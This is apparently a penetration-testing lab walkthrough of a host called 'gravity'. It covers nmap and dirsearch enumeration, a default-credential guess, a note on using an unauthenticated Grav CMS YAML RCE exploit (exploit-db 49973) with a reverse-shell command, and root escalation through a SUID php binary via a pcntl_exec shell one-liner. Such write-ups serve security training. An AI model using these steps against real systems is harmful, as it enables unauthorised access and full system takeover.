### Enumeration
```
IP=192.168.187.12
sudo nmap -sU $IP
sudo nmap -p- -vv $IP
sudo nmap -p22,80 -A $IP
```
#### Ports 
- 22
	- OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
- 80
	- Apache httpd 2.4.41
### Foothold
- 80
	- Default
		- ![[Pasted image 20240627140318.png]]
	- /grav-admin
		- ![[Pasted image 20240627140332.png]]
	- Google grav admin exploit
		- exploitdb 49973
			- unauthenticated yaml RCE
			- Edit target IP
			- Edit base64 command to have IP and port
			- Leads to RCE
	- dirsearch -u http://$IP
		- nothing
	- dirsearch -u http://$IP/grav-admin
		- /admin
			- ![[Pasted image 20240627141038.png]]
			- admin:admin  -  failed
		- /backup
			- forbidden
		- /bin
			- forbidden
		- /assets
		- /cache
		- /login
		- /robots.txt
			- ![[Pasted image 20240627141102.png]]
### PE
#### Linux
- www-data
	- id
		- uid=33(www-data) gid=33(www-data) groups=33(www-data)
	- sudo -l
		- needs password
	- uname -a
		- `Linux gravity 5.4.0-146-generic #163-Ubuntu SMP Fri Mar 17 18:26:02 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux`
	- capabilities
		- none
	- suid
		- /usr/bin/php7.4
		- GTFOBins for php
		- `CMD="/bin/sh"
		- `./php -r "pcntl_exec('/bin/sh', ['-p']);"`
			- `/usr/bin/php7.4 -r "pcntl_exec('/bin/sh', ['-p']);"`
		- now we are rooted
		- ![[Pasted image 20240627142438.png]]
	- linpeas
### Lessons Learned